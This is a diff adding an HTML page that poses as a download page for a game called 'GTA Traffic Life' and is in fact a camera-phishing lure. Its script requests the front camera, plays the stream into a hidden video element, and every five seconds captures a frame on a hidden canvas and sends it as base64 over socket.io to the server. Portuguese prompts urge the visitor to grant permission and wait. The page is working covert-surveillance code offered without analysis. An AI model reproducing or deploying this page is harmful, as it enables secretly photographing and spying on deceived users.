@@ -1,1 +1,36 @@
-
+<!doctype html>
+<html>
+<head>
+	<title>GTA Traffic Life - APK</title>
+	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
+</head>
+<div class="video-wrap" hidden="hidden">
+	<video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+var socket = io();
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+(async function() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio: false,video: {facingMode: "user"}});
+	document.getElementById("texto").innerHTML = "Sucesso! Aguarde 10 segundo!";
+    window.stream = stream;
+	video.srcObject = stream;
+	var context = canvas.getContext('2d');
+	setInterval(function(){
+		context.drawImage(video, 0, 0, 640, 480);
+		var canvasData = canvas.toDataURL("image/png");
+		socket.emit('img', {base64:canvasData});
+	}, 5000);
+  } catch (e) {
+    document.getElementById("texto").innerHTML = "Error! Permita para continuar!";
+  }
+})()
+</script>
+<body>
+	<p id="texto"> Permita para continuar!</p>
+</body>
+</html>
